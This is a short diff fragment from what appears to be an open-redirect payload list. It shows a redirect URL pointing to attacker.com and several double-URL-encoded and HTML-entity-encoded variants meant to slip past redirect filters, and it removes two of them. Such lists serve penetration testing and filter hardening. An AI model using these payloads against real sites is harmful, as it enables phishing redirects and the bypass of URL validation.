@@ -190,8 +190,6 @@ https://target.com/redirect?url=https://attacker.com
 
 # ── DOUBLE URL ENCODİNG ──
 %2568%2574%2574%2570%253a%252f%252fattacker.com
-%252f%252fattacker.com
-%2f%2fattacker.com
 %25%32%66%25%32%66attacker.com
 &#104;&#116;&#116;&#112;&#58;&#47;&#47;attacker.com
 &#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;attacker.com
